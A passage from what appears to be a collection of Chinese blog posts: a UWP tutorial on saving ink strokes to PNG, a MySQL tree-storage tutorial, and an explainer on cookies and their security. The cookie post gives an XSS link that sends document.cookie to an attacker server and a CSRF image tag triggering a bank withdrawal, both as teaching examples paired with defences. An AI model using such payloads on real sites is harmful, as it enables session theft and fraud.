AA，BB，CC，DD，EE，FF，GG……甚至有的不下二三十项要求。老周觉得这些公司基本上是神经病，先不说世界没有人能精通那么多东西，就算真有人能精通那么多，那估计这个人也活不久了，早晚得累死的。\n实际上，Web 前端你能学会三样东西就够了——HTML、CSS、JS，其他纯属娱乐。\n所以，学习编程的话，你抓几个有代表性地学就好了，比如C/C++，.net，PHP，Java 这些，其余的嘛，现学现用，用完就扔。你要是想让自己变成高手的话，那你就必须挑一个方向，纵向深度发展。什么都学等于什么都不通，学乱七八糟的东西是成不了高手的。就拿黑客这一活儿来说，只有第一代，第二代黑客比较强，后面的基本是菜鸟，一代不如一代。没办法，浮躁的时代，IT业也不可幸免的。\n \n好了，上面的都是P话，下面老周开始说正题，今天咱们谈谈如何将电子墨迹保存到图像。在近年来出现的各种花拳绣腿技术中，电子墨迹还算是有实用价值的东西。还有触控、虚拟化这些，也有一定的用途。人工智障倒是可有可无，可作为辅助，但不太可靠，最起码它代替不了人脑（笨蛋例外），我估计将来搞艺术可能吃香，毕竟机器是不懂艺术的。普工可能会大量失业，因为他们做的事情可以让机器做了（主要是重复性，机械性的工作）。\n拿笔写字是人的本能，千万不要鼠标键盘用多了连笔都拿不动（这已经是“鼠标手”的轻度症状了，不及时治疗，以后会很难看的）。科技再发达，人类的本能绝不能丢，就好比哪天你连穿衣吃饭都不会了，那你活该饿死。\n本文就介绍两种比较简单的方法：\n第一种是运用 win 2D 封装的功能来完成。老周做的那个“练字神器”应用就是用这种方法保存你的书法作品的，其中的宣纸纸纹原理也很简单，就是分层绘制，首先在底层绘制纸张的纹理图案，然后再把墨迹绘制到底纹之上即可。\n第二种不需要借助其他 Nuget 上的库，只要使用 1709 最新的 API 就能实现。\n \n \n先说第一种方案。\n为了演示，老周就做简单一点。下面 XAML 代码在界面上声明了一个 InkCanvas ，用来收集输入的墨迹，然后一个 Button ，点击后选择文件路径，然后保存为 png 图片。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <InkCanvas Name=\"inkcv\"/>\n        <Button Content=\"保存墨迹\" Click=\"OnClick\"  Grid.Row=\"1\" Margin=\"2,9.5\"/>\n    </Grid>\n\n接着，你要打开 nuget 管理器，向项目添加 Win 2D 的引用。这个老周不多说了，你懂怎么操作的。\n如果你绘制的墨迹图像需要在界面上显示，可以用 CanvasControl 控件，然后处理 Draw 事件，如果不需要在界面上显示，例如这个例子，我们是直接保存为图像文件的，所以不需要在界面上添加 CanvasControl 元素了。\n前面在写 UI Composition 的文章时，老周曾用过 Win 2D 做演示，负责绘制操作的是 CanvasDrawingSession 类，其中，你会发现，它有一个方法叫 DrawInk，对的，我们用的就是它，它可以把我们从用户输入收集到的墨迹绘制下来。它有两个重载，其中一个是指定是否绘制成高对比度模式。\n好，理论上的屁话不多说，我直接上代码，你一看就懂的。\n不过，在页面类的构造函数中，我们得先设置一下书写的参数，比如笔触大小、颜色等。\n\n        public MainPage()\n        {\n            this.InitializeComponent();\n            // 支持笔，手触，鼠标输入\n            inkcv.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设定笔迹颜色为红色\n            InkDrawingAttributes data = new InkDrawingAttributes();\n            data.Color = Colors.Red;\n            // 笔触大小\n            data.Size = new Size(15d, 15d);\n            // 忽略笔的倾斜识别，毕竟只有新型的笔才有这感应\n            data.IgnoreTilt = true;\n            // 更新参数\n            inkcv.InkPresenter.UpdateDefaultDrawingAttributes(data);\n        }\n\n \n随后就可以处理 Button 的 Click 事件了。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            // 如果没有输入墨迹，那就别浪费 CPU 时间了\n            if(inkcv.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n            {\n                return;\n            }\n\n            // 选择保存文件\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n            picker.SuggestedStartLocation = PickerLocationId.Desktop;\n            StorageFile file = await picker.PickSaveFileAsync();\n            if (file == null) return;\n\n            // 建一个在内存中用的画板（不显示在 UI 上）\n            // 获取共享的 D2D 设备引用\n            CanvasDevice device = CanvasDevice.GetSharedDevice();\n            // 图像大小与 InkCanvas 控件大小相同\n            float width = (float)inkcv.ActualWidth;\n            float height = (float)inkcv.ActualHeight;\n            // DPI 为 96\n            float dpi = 96f;\n            CanvasRenderTarget drawtarget = new CanvasRenderTarget(device, width, height, dpi);\n            // 开始作画\n            using(var drawSession = drawtarget.CreateDrawingSession())\n            {\n                // 我们上面设置了用的是红笔\n                // 为了生成图片后看得清楚\n                // 把墙刷成白色\n                drawSession.Clear(Colors.White);\n                // 画墨迹\n                drawSession.DrawInk(inkcv.InkPresenter.StrokeContainer.GetStrokes());\n            }\n            // 保存到输出文件\n            await drawtarget.SaveAsync(await file.OpenAsync(FileAccessMode.ReadWrite), CanvasBitmapFileFormat.Png, 1.0f);\n            // 释放资源\n            drawtarget.Dispose();\n        }\n\n \n运行应用后，随便写点啥上去。如下图。\n\n \n 然后点击按钮，保存一下。生成的图片如下图所示。\n\n \n \n 好，第一种方案完结，接下来咱们用第二种方案。\n这是 1709 （秋季创作者更新）的新功能。新的 SDK 中增加了一个 CoreInkPresenterHost 类（位于 Windows.UI.Input.Inking.Core 命名空间），使用这类，你可以不需要 InkCanvas 控件，你可以把墨迹接收图面放到任意的 XAML 元素上。因为该类公开一个 RootVisual 属性，注意它不是指向 XAML 可视化元素，而是 ContainerVisual 对象。这是 UI Composition 中的容器类。\n老周前不久刚写过一堆与 UI Composition 有关的文章，如果你不了解相关内容，可以看老周前面的烂文。通过前面对 UI Composition 的学习，我们知道，可以将可视化对象添加到任意 XAML 可视化元素上。对，这个 CoreInkPresenterHost 类就是运用了这个特点，使得墨迹收集可以脱离 InkCanvas 控件，以后，你爱在哪个元素上收集墨迹都行，比如，你想让用户可以对图像进行涂鸦，你就可以把这个类放到 Image 元素上。\nP话少说，咱们来点干货。下面的例子，其界面和前一个例子相似，只是没有用上 InkCanvas 控件，而只是声明了个 Border 元素。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <Border Name=\"bd\" Margin=\"3\" BorderThickness=\"1\" BorderBrush=\"Green\"/>\n        <Button Grid.Row=\"1\" Margin=\"4,8\" Content=\"保存墨迹\" Click=\"OnClick\"/>\n    </Grid>\n\n然后切换到代码文件，在页面类的构造函数中，进行一下初始化。初始化的东西挺多，包括用 Compositor 创建用来承载墨迹的容器 Visual ，以及设置笔触参数。\n\n        CoreInkPresenterHost inkHost = null;\n        public MainPage()\n        {\n            this.InitializeComponent();\n\n            // 组装一个 UI，把一个可视化容器放到 Border 上\n            Visual bdvisual = ElementCompositionPreview.GetElementVisual(bd);\n            var compositor = bdvisual.Compositor;\n            // 创建一个容器\n            ContainerVisual inkContainer = compositor.CreateContainerVisual();\n            // 此时因为各元素的宽度和高度都为0，所以用动画来更新容器的大小\n            var expressAnimate = compositor.CreateExpressionAnimation();\n            expressAnimate.Expression = \"bd.Size\";\n            expressAnimate.SetReferenceParameter(\"bd\", bdvisual);\n            inkContainer.StartAnimation(\"Size\", expressAnimate);\n            // 设置容器与 Border 关联\n            ElementCompositionPreview.SetElementChildVisual(bd, inkContainer);\n\n            // 处理墨迹收集关联\n            inkHost = new CoreInkPresenterHost();\n            inkHost.RootVisual = inkContainer;\n            inkHost.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设置笔触参数\n            InkDrawingAttributes attrib = new InkDrawingAttributes();\n            attrib.Color = Colors.SkyBlue;\n            attrib.Size = new Size(15f, 15f);\n            attrib.IgnoreTilt = true;\n            // 更新参数\n            inkHost.InkPresenter.UpdateDefaultDrawingAttributes(attrib);\n        }\n\n创建了容器 Visual 后，记得要通过 CoreInkPresenterHost 对象的 RootVisual 属性来关联。当然你不能忘了把这个 visual 加到 Border 的子元素序列上。\n现在处理 Click 事件，用 RenderTargetBitmap 类，把 Border 的内容画出来，这样会连同它上面的墨迹也一起画出来。\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n\n然后用图像编码器写入文件就行了。\n\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n\n \n完整的事件处理代码如下。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            if (inkHost.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n                return;\n\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像文件\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n\n            StorageFile outFile = await picker.PickSaveFileAsync();\n            if (outFile == null)\n                return;\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n        }\n\n \n好，完事了，现在运行一下，直接中 Border 元素上写点东东。\n\n \n然后点击底部的按钮保存为图片，如下图所示。\n\n \n \nOK，本文就扯到这里了，开饭，不然饭菜凉了。\n "},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案一 Adjacency List）","body":"　　今天来看看一个比较头疼的问题，如何在数据库中存储树形结构呢？\n　　像mysql这样的关系型数据库，比较适合存储一些类似表格的扁平化数据，但是遇到像树形结构这样有深度的人，就很难驾驭了。\n　　举个栗子：现在有一个要存储一下公司的人员结构，大致层次结构如下：\n\n \n　　（画个图真不容易。。）\n　　那么怎么存储这个结构？并且要获取以下信息：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n　　\n方案一、(Adjacency List)只存储当前节点的父节点信息。\n　　CREATE TABLE Employees(　　eid int,　　ename VARCHAR(100),        position VARCHAR(100),　　parent_id int　　)\n　　记录信息简单粗暴，那么现在存储一下这个结构信息：\n　　\n　　好的，现在开始进入回答环节：\n　　1.查询小天的直接上司：\n 　　SELECT e2.eid,e2.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e1.ename='小天';\n　　\n　　2.查询老宋管理下的直属员工：\n　　SELECT e1.eid,e1.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e2.ename='老宋';\n　　\n　　3.查询小天的所有上司。\n　　这里肯定没法直接查，只能用循环进行循环查询，先查直接上司，再查直接上司的直接上司，依次循环，这样麻烦的事情，还是得先建立一个存储过程：\n　　睁大眼睛看仔细了，接下来是骚操作环节：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSuperiors`(`uid` int) RETURNS varchar(1000) CHARSET gb2312\nBEGIN\n    DECLARE superiors VARCHAR(1000) DEFAULT '';\n    DECLARE sTemp INTEGER DEFAULT uid;\n    DECLARE tmpName VARCHAR(20);\n\n    WHILE (sTemp>0) DO\n        SELECT parent_id into sTemp FROM employees where eid = sTemp;\n        SELECT ename into tmpName FROM employees where eid = sTemp;\n        IF(sTemp>0)THEN\n            SET superiors = concat(tmpName,',',superiors);\n        END IF;\n    END WHILE;\n        SET superiors = LEFT(superiors,CHARACTER_LENGTH(superiors)-1);\n    RETURN superiors;\nEND\n\n　　这一段存储过程可以查询子节点的所有父节点，来试验一下　\n \n　　好的，骚操作完成。\n　　显然，这样。获取子节点的全部父节点的时候很麻烦。。\n　　4.查询老王管理的所有员工。\n　　思路如下：先获取所有父节点为老王id的员工id，然后将员工姓名加入结果列表里，在调用一个神奇的查找函数，即可进行神奇的查找：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSubordinate`(`uid` int) RETURNS varchar(2000) CHARSET gb2312BEGIN   DECLARE str varchar(1000);  DECLARE cid varchar(100);DECLARE result VARCHAR(1000);DECLARE tmpName VARCHAR(100);SET str = '$';   SET cid = CAST(uid as char(10));   WHILE cid is not null DO     SET str = concat(str, ',', cid);   SELECT group_concat(eid) INTO cid FROM employees where FIND_IN_SET(parent_id,cid);         END WHILE;  SELECT GROUP_CONCAT(ename) INTO result FROM employees WHERE FIND_IN_SET(parent_id,str);RETURN result;   END\n\n　　看神奇的结果：\n　\n　　虽然搞出来了，但说实话，真是不容易。。。\n　　这种方法的优点是存储的信息少，查直接上司和直接下属的时候很方便，缺点是多级查询的时候很费劲。所以当只需要用到直接上下级关系的时候，用这种方法还是不错的，可以节省很多空间。后续还会介绍其它存储方案，并没有绝对的优劣之分，适用场合不同而已。\n　　本篇至此告一段落，欢迎大家继续关注。\n "},{"title":"这一次带你彻底了解Cookie","body":"前言\n网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为URL参数的一部分传递。这两个解决方案都手动操作，容易出错。\n网景公司当时一名员工Lou Montulli，在1994年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持cookies。\ncookie是什么\ncookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。\n由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。\n其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。\n\n如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。\ncookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。\ncookie的类型\n可以按照过期时间分为两类：会话cookie和持久cookie。会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息。\n\n持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;\n\ncookie的属性\ncookie的域\n产生Cookie的服务器可以向set-Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie，例如下面：\n\nSet-Cookie: name=\"wang\"; domain=\"m.zhuanzhuan.58.com\"\n\n如果用户访问的是m.zhuanzhuan.58.com那就会发送cookie: name=\"wang\", 如果用户访问www.aaa.com（非zhuanzhuan.58.com）就不会发送这个Cookie。\ncookie的路径 Path\nPath属性可以为服务器特定文档指定Cookie，这个属性设置的url且带有这个前缀的url路径都是有效的。\n例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个url。 m.zhuanzhuan.58.com 设置cookie\n\nSet-cookie: id=\"123432\";domain=\"m.zhuanzhuan.58.com\";\n\nm.zhaunzhuan.58.com/user/ 设置cookie：\n\nSet-cookie：user=\"wang\", domain=\"m.zhuanzhuan.58.com\"; path=/user/\n\n但是访问其他路径m.zhuanzhuan.58.com/other/就会获得\n\ncookie: id=\"123432\"\n\n如果访问m.zhuanzhuan.58.com/user/就会获得\n\n  cookie: id=\"123432\"\n  cookie: user=\"wang\"\n\n \nsecure\n设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过cookie传输的.\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;\n\n\nchrome 52和firefox 52 开始不安全的（HTTP）是无法使用secure的：\n\n操作Cookie\n通过docuemnt.cookie可以设置和获取Cookie的值\n\ndocument.cookie = \"user=wang\";\nconsole.log(document.cookie);\n\n\n禁止javascript操作cookie（为避免跨域脚本(xss)攻击，通过javascript的document.cookie无法访问带有HttpOnly标记的cookie。）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly\n\n第三方cookie\n通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。\n\n如上图（a）：用户访问服务器1的一个页面index.html，这个页面和第三方广告网站合作，这个页面还有一张www.advertisement.com域名下的一张广告图ad1.jpg，当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie\n\nSet-Cookie: user=\"wang\";like=\"a\"; domain=\"advertisement.com\"\n\n记录用户的浏览记录，分配一个user来表示用户的身份。\n图（b）：用户访问服务器2的一个index.html页面，这个页面也和同一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad2.jpg，当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\";\n\nwww.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie\n\nSet-Cookie: buy=\"b\"; domain=\"advertisement.com\"\n\n图（c）：很巧，用户访问服务器3的一个index.html页面，这个页面也和那一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad3.jpg，当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie\n\nCookie:  user=\"wang\"; like=\"a\"; buy=\"b\"\n\n这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。\n安全\n多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：\n网络窃听\n网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。\n解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。\nDNS缓存中毒\n如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器 h123456.www.demo.com/img_01.png 发布图片。用户访问这个图片，由于 www.demo.com和h123456.www.demo.com是同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。\n一般情况下是不会发生这种情况，通常是网络供应商错误。\n跨站点脚本XSS\n使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。\n例子：\n\n<a href=\"#\" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>\n\n当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。\n解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。\n跨站请求伪造CSRF\n例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，\n\n<img  src = \"http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing\" >\n\n如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。\n解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。\n 如果你喜欢我们的文章，关注我们的公众号和我们互动吧。\n "}]